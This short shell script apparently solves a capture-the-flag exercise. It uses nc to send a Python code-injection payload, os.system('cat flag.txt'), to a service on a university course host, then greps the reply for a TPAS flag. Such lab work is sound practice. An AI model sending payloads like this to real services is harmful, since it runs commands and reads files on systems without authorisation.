#!/bin/sh

echo "os.system('cat flag.txt')" | nc tpas.alunos.dcc.fc.up.pt 5005 | grep -oE "TPAS{.+}" --color=none
